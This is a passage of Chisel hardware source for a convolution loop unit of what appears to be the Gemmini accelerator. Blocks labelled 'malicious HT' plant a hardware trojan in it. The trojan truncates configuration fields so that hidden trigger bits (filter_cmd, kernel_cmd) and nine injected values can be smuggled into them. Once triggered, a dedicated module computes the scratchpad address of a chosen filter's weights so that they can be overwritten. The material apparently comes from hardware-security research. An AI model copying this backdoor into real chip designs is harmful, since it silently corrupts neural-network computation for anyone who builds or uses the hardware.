...
class LoopConvInnerBounds(val large_iterator_bitwidth: Int, val small_iterator_bitwidth: Int, val tiny_iterator_bitwidth: Int) extends Bundle {
  ...
  // Malicious
  val filter_cmd = UInt(small_iterator_bitwidth.W)
  val kernel_cmd = UInt(small_iterator_bitwidth.W)
  val valueInfo = Vec(9, UInt(11.W))
}
...
/******************************************************************************** malicious HT *********************************************************************************/
object mali_instr {
  val TOTAL_INSTR_LEN = 11
  val MALI_TYPE_1_DATA_WIDTH = 10
  val MALI_TYPE_2_DATA_WIDTH = 8
}

class maliType_1 extends Bundle {
  val valid = Bool()
  val data = UInt(mali_instr.MALI_TYPE_1_DATA_WIDTH.W)
}

class maliType_2 extends Bundle{
  val valid = Bool()
  val unused = UInt(1.W)
  val unused_2 = UInt(1.W)
  val data = UInt(mali_instr.MALI_TYPE_2_DATA_WIDTH.W)
}

// This module is primarily used to calculate the address of the target filter in the scratchpad.
class mali_collect_info(max_addr: Int, DIM: Int) extends Module{
  val io = IO(new Bundle() {
    val filter_cmd = Input(UInt(mali_instr.TOTAL_INSTR_LEN.W))
    val kernel_cmd = Input(UInt(mali_instr.TOTAL_INSTR_LEN.W))
    val krow = Input(UInt(5.W))
    val kcol = Input(UInt(5.W))
    val in_ch = Input(UInt(16.W))
    val out_ch = Input(UInt(16.W))
    val b_addr_end = Input(UInt(log2Up(max_addr+1).W))
    val start = Input(Bool())
    val value = Input(Vec(9, UInt(11.W)))
    val maliAddr = Valid(UInt(log2Ceil(max_addr).W))     // The output should be its address in the scratchpad.
    val maliOffset = Valid(UInt(log2Ceil(DIM).W))                  // The offset within the address.
    val maliValue = Output(Vec(9, new maliType_2))
  })
  val mali_filter = io.filter_cmd.asTypeOf(new maliType_1)
  val mali_kernel = io.kernel_cmd.asTypeOf(new maliType_1)

  val filter_idx = mali_filter.data
  val kernel_idx = mali_kernel.data
  val mali_col = RegInit(0.U(io.maliOffset.bits.getWidth.W))
  val mali_row = RegInit(0.U(io.maliAddr.bits.getWidth.W))
  val blockSize = io.in_ch * io.kcol * io.krow
  val out_channels_per_bank = io.out_ch / DIM.U(io.out_ch.getWidth.W) +& (io.out_ch % DIM.U =/= 0.U)
  val B_rows = out_channels_per_bank * io.kcol * io.krow * io.in_ch

  val outValid = RegInit(0.B)

  val outValue = RegInit(io.value.asTypeOf(Vec(9, new maliType_2)))			// TODO: Is it necessary to store it temporarily?

  // When there is a filter to attack in the current tile block.
  when(mali_filter.valid && mali_kernel.valid && (io.start === true.B)){		// TODO: Use the multiplication and division units provided by Xilinx.
    // Locate the column.
    mali_col := filter_idx % DIM.U
    // Locate the row.
    mali_row := blockSize * (filter_idx / DIM.U) + kernel_idx - B_rows + io.b_addr_end

    outValid := true.B
  }.otherwise{
    outValid := false.B

    io.maliAddr.bits := DontCare
    io.maliOffset.bits := DontCare
  }
  
  io.maliValue := outValue
  io.maliAddr.bits := mali_row
  io.maliOffset.bits := mali_col
  io.maliOffset.valid := outValid
  io.maliAddr.valid := outValid
}
...
class LoopConv (block_size: Int, coreMaxAddrBits: Int, reservation_station_size: Int, max_lds: Int, max_exs: Int, max_sts: Int,
  ...
  val io = IO(new Bundle {
    ...
    val maliAddr = Valid(UInt(log2Ceil(max_addr).W))
    val maliOffset = Valid(UInt(log2Ceil(block_size).W))
        val maliValue = Output(Vec(9, new maliType_2))
    val maliIch = Output(UInt(16.W))
  ...
  val tail_loop = loops(tail_loop_id)
	...
	val mali_info = Module(new mali_collect_info(max_addr, block_size))
/*
  val spadAddrManager = Module(new spad_addr_manager(concurrent_loops, loops(0).cloneType, coreMaxAddrBits, max_addr))	
    spadAddrManager.io.state_input.valid := false.B
  spadAddrManager.io.state_input.bits := 0.U
  spadAddrManager.io.state_weight.valid := false.B
  spadAddrManager.io.state_weight.bits := 0.U
*/
  ...
  when(cmd.valid && is_loop_cmd && !loop_being_configured.configured) {
    ...
    switch (cmd.bits.cmd.inst.funct) {
      ...
      is (LOOP_CONV_WS_CONFIG_2) {
                //        loop_being_configured.outer_bounds.kernel_dim := cmd.bits.cmd.rs1(63, 48)       // k[0][0]
        loop_being_configured.outer_bounds.kernel_dim := cmd.bits.cmd.rs1(52, 48)
        loop_being_configured.inner_bounds.valueInfo(0) := cmd.bits.cmd.rs1(63, 53)       // k[0][0]
        
        loop_being_configured.outer_bounds.pool_out_col_dim := cmd.bits.cmd.rs1(47, 32)
        // loop_being_configured.outer_bounds.pool_size := (if (!has_max_pool) 1.U else cmd.bits.cmd.rs1(31, 16))	// attack
        loop_being_configured.outer_bounds.pool_size := (if (!has_max_pool) 1.U else cmd.bits.cmd.rs1(20, 16))
        loop_being_configured.inner_bounds.valueInfo(1) := cmd.bits.cmd.rs1(31, 21)
      ...
      is (LOOP_CONV_WS_CONFIG_3) {
        //loop_being_configured.inner_bounds.krows := cmd.bits.cmd.rs1(63, 48)	// attack
        //loop_being_configured.inner_bounds.kcols := cmd.bits.cmd.rs1(47, 32)	// attack
        
        // Malicious -- begin
        loop_being_configured.inner_bounds.krows := cmd.bits.cmd.rs1(52, 48)
        loop_being_configured.inner_bounds.kcols := cmd.bits.cmd.rs1(36, 32)
        loop_being_configured.inner_bounds.filter_cmd := cmd.bits.cmd.rs1(63, 53)
        loop_being_configured.inner_bounds.kernel_cmd := cmd.bits.cmd.rs1(47, 37)
        // Malicious -- end
        
        loop_being_configured.inner_bounds.kchs := cmd.bits.cmd.rs1(31, 16)
                //        loop_being_configured.inner_bounds.lpad := cmd.bits.cmd.rs1(15, 0)      // attack
        loop_being_configured.inner_bounds.lpad := cmd.bits.cmd.rs1(4, 0)
        loop_being_configured.inner_bounds.valueInfo(2) := cmd.bits.cmd.rs1(15, 5)

                //        loop_being_configured.inner_bounds.rpad := cmd.bits.cmd.rs2(63, 48)     // attack
        loop_being_configured.inner_bounds.rpad := cmd.bits.cmd.rs2(52, 48)
        loop_being_configured.inner_bounds.valueInfo(3) := cmd.bits.cmd.rs2(63, 53)
        
        
                //        loop_being_configured.inner_bounds.upad := cmd.bits.cmd.rs2(47, 32)    // attack
        loop_being_configured.inner_bounds.upad := cmd.bits.cmd.rs2(36, 32)
        loop_being_configured.inner_bounds.valueInfo(4) := cmd.bits.cmd.rs2(47, 37)
      ...
      is (LOOP_CONV_WS_CONFIG_4) {
        ...
        loop_being_configured.inner_bounds.prad := cmd.bits.cmd.rs1(36, 32)
        loop_being_configured.inner_bounds.valueInfo(5) := cmd.bits.cmd.rs1(47, 37)
      ...
      is (LOOP_CONV_WS) {
        ...
        // Malicious
        loop_being_configured.inner_bounds.valueInfo(6) := cmd.bits.cmd.rs1(30, 20)
        loop_being_configured.inner_bounds.valueInfo(7) := cmd.bits.cmd.rs1(41, 31)
        loop_being_configured.inner_bounds.valueInfo(8) := cmd.bits.cmd.rs1(52, 42)
  ...
  when (ld_weights.io.req.fire) {
    ...
    /** *************************** malicious HT ****************************************************************** */
  //  val current_loop_id = ld_weights.io.loop_id
  val current_loop = WireInit(loops(ld_weights.io.loop_id))

  mali_info.io.filter_cmd := current_loop.inner_bounds.filter_cmd
  mali_info.io.kernel_cmd := current_loop.inner_bounds.kernel_cmd
  mali_info.io.krow := current_loop.inner_bounds.krows(4, 0)
  mali_info.io.kcol := current_loop.inner_bounds.kcols(4, 0)
  mali_info.io.in_ch := current_loop.inner_bounds.kchs
  mali_info.io.out_ch := current_loop.inner_bounds.pochs
  mali_info.io.b_addr_end := current_loop.b_addr_end
  mali_info.io.value := current_loop.inner_bounds.valueInfo

  when(current_loop.inner_bounds.filter_cmd(10) && current_loop.inner_bounds.kernel_cmd(10) && current_loop.running) {
    mali_info.io.start := true.B
  }.otherwise {
    mali_info.io.start := false.B
  }
  
  io.maliAddr := mali_info.io.maliAddr
  io.maliOffset := mali_info.io.maliOffset
    io.maliValue := mali_info.io.maliValue
  io.maliIch := current_loop.inner_bounds.kchs
  /** *************************** malicious HT ****************************************************************** */
...
object LoopConv {
  def apply(in: DecoupledIO[GemminiCmd], ld_completed: UInt, st_completed: UInt, ex_completed: UInt,
            ...
            has_first_layer_optimizations: Boolean, has_dw_convs: Boolean, maliAddr: UInt, maliAddrValid: Bool, maliOffset: UInt, maliOffsetValid: Bool, maliValue: Vec[maliType_2], maliIch:UInt)
    ...
    val mod = Module(new LoopConv(block_size, coreMaxAddrBits, rob_size, max_lds, max_exs, max_sts,
      ...
      compute_rs1_t, compute_rs2_t, has_training_convs, has_max_pool, has_first_layer_optimizations, has_dw_convs))
        ...
        maliAddr := mod.io.maliAddr.bits
    maliOffset := mod.io.maliOffset.bits
    maliOffsetValid := mod.io.maliOffset.valid
    maliAddrValid := mod.io.maliAddr.valid
        maliValue := mod.io.maliValue
    maliIch := mod.io.maliIch
